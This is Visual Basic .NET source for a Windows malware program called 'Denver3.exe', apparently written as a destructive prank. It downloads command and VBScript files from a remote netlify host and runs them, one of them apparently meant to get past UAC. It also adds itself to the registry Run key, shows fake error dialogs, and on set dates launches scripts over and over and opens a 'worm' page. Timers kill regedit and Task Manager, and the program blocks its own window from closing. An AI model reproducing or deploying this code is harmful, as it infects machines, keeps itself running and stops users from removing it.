Imports System
Imports System.IO
Imports System.Net
Imports System.Text
Public Class Form1
    Dim Close1 As Boolean = False
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If CheckForInternetConnection() Then

            Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)

            Try
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
            Catch ex As Exception

            End Try
            Try
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
            Catch ex As Exception

            End Try
            Try
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/KillRunTime.cmd", Application.StartupPath & "\KillRunTime.cmd")
            Catch ex As Exception

            End Try
            Try
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/RemoveDenver3.cmd", Application.StartupPath & "\RemoveDenver3.cmd")
            Catch ex As Exception

            End Try
            Try
                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
            Catch ex As Exception
            End Try
            If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
                MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
                Try
                    Dim path As String = UserFoler & "\Denver3.runtime"
                    Dim fs As FileStream = File.Create(path)
                    Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
                    fs.Write(info, 0, info.Length)
                    fs.Close()
                    Hacking_into_pc.Show()
                    Wait(10)

                    Try
                        My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/fuckuac.cmd", Application.StartupPath & "\fuckuac.cmd")
                    Catch ex As Exception

                    End Try
                    Process.Start(Application.StartupPath & "\fuckuac.cmd")
                    Hacking_into_pc.Close()
                    MsgBox("Your computer has been infected with Denver3.exe. the next generation of Yuki3")





                Catch ex As Exception

                End Try

            End If

            'https://denver3289yf998dh287hd9hd9827h.netlify.app/TrainFurry.mp4
            Dim currentTime As System.DateTime = System.DateTime.Now
            If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
                RipConeehasOldAcc.Show()
            End If
            If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                TrainIsAFurryLmao.Show()
            End If
            If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
                GoPlayHLAlyx.Show()
            End If
            If currentTime.Month = 3 And currentTime.Date.Day = 1 Then
                GoPlayHL2.Show()
            End If
            If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
                FreeRobuxGen.Show()
            End If
            If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
                FreeRobuxGen.Show()
            End If
            If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/spongebob.wav", UserFoler & "\spongebob.wav")
                Catch ex As Exception
                End Try
                My.Computer.Audio.Play(UserFoler & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
            End If
            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/worm.html", UserFoler & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
                Process.Start(UserFoler & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
            End If
            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
                Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
            End If
            If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
                MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
                'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav", UserFoler & "\NAHIMTOOPOWERRFULL_666.wav")


                Catch ex As Exception

                End Try
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAH.CMD", UserFoler & "\NAH.CMD")
                Catch ex As Exception

                End Try
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", UserFoler & "\SkillE.vbs")

                Catch ex As Exception

                End Try


                My.Computer.Audio.Play(UserFoler & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
                MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\NAH.CMD")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
            End If
            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", UserFoler & "\SkillE.vbs") '8-Bit Nyan_C.wav

                Catch ex As Exception

                End Try
                MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")
                Process.Start(UserFoler & "\SkillE.vbs")

            End If
            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
                ScreenStuck.Show()
            End If
            If currentTime.Month = 11 Then
                Try
                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/8-Bit%20Nyan_C.wav", UserFoler & "\Neon.wav")
                Catch ex As Exception
                End Try
                My.Computer.Audio.Play(UserFoler & "\Neon.wav", AudioPlayMode.BackgroundLoop)
                MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
            End If
        Else
            MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
            Close1 = True
            Me.Close()
        End If

    End Sub
    Private Sub Wait(ByVal seconds As Integer)
        For i As Integer = 0 To seconds * 100
            System.Threading.Thread.Sleep(10)
            Application.DoEvents()
        Next
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Not Close1 Then
            e.Cancel = True
        End If

    End Sub

    Private Sub NoReg_Tick(sender As Object, e As EventArgs) Handles NoReg.Tick
        Dim pName As String = "regedit"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("regedit")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub NoTask_Tick(sender As Object, e As EventArgs) Handles NoTask.Tick
        Dim pName As String = "Taskmgr"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("Taskmgr")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                Using stream = client.OpenRead("http://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function
End Class

Public Class MyUtilities
    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub
End Class
